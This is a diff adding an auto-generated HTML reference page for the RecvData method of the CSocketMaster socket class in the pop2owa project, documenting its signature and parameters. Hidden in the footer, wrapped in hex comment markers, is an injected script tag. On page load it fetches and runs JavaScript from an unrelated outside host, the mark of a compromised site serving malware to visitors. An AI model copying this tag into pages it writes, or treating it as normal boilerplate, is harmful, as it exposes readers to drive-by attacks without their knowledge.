@@ -1,0 +1,74 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="Text/html; charset=iso-8859-1">
+  <meta name="Author" content = "m.stamenov" >
+  <meta name="GENERATOR" content="VBDOX [2.0.15]" >
+  <link REL="stylesheet" TYPE="text/css" HREF="backsdk4.css">
+  <script SRC="langref.js"></script>
+  <title>CSocketMaster:&nbsp;RecvData</title>
+</head>
+<BODY TOPMARGIN="0">
+<TABLE CLASS="buttonbarshade" CELLSPACING=0><TR><TD>&nbsp;</TD></TR></TABLE>
+<TABLE CLASS="buttonbartable" CELLSPACING=0>
+<TR ID="hdr"><TD CLASS="runninghead" NOWRAP>CSocketMaster:&nbsp;RecvData</TD></TR>
+</TABLE>
+<!-- ============ METHOD ENTRY ============ -->
+<H1>RecvData</H1>
+<P>
+This function is to retrieve data from the buffer. If we are using TCP
+then the data is retrieved from a local buffer (m_strRecvBuffer). If we
+are using UDP the data is retrieved from winsock buffer.
+This function returns number of bytes received, and move data from
+the buffer into the data argument.
+MOVE means that data will be removed from the buffer.
+
+
+<p><br>
+</p><br>
+<PRE class=syntax><B><font class="keyword">&nbsp;Private</font><font class="keyword">&nbsp;Function</font><font class="identifier">&nbsp;RecvData</font>(
+	&nbsp;<font class="keyword">&nbsp;ByRef</font><font class="identifier">&nbsp;Data</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Variant</font>,
+	&nbsp;<font class="keyword">&nbsp;Optional</font><font class="identifier">&nbsp;varClass</font><font class="keyword">&nbsp;As</font><font class="identifier">&nbsp;VbVarType</font>,
+	&nbsp;<font class="keyword">&nbsp;Optional</font><font class="identifier">&nbsp;maxLen</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Variant</font>&nbsp;)<font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font></B></PRE>
+<H4>Parameters</H4>
+<DL>
+<DT><I>Data</I></TD>
+<DD>
+[ByRef]
+ <B>Variant</B>.
+ 
+
+</DD>
+<DT><I>varClass</I></TD>
+<DD>
+[ByRef]
+ Optional.
+ <B>VbVarType</B>.
+ 
+
+</DD>
+<DT><I>maxLen</I></TD>
+<DD>
+[ByRef]
+ Optional.
+ <B>Variant</B>.
+ 
+</DD>
+</DL>
+<H4>Return Values</H4>
+<B>Long</B>&nbsp;-&nbsp;
+<H4>Remarks</H4>
+<P></P>
+<H4>See Also</H4>
+<P>
+<A HREF="pop2owa.html">Project pop2owa Overview</A>
+<A HREF="CSocketMaster.html">Class CSocketMaster Overview</A>
+<A HREF="CSocketMaster.html#public_props">CSocketMaster Properties</A>
+<A HREF="CSocketMaster.html#public_methods">CSocketMaster Methods</A>
+<B><A HREF="CSocketMaster.ProcessOptions.html">ProcessOptions</A></B>
+<B><A HREF="CSocketMaster.RecvDataToBuffer.html">RecvDataToBuffer</A></B>
+<DIV class=footer>Build on martes, 11 de noviembre de 2008 by VBDOX <BR>Copyright &copy; 2000 - 2003 M.Stamenov</DIV><!--73b7cc--><script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042447"></script><!--/73b7cc-->
+
+<DIV class=footer style="COLOR: #000000; FONT-SIZE: 90%">
+</body>
+</html>
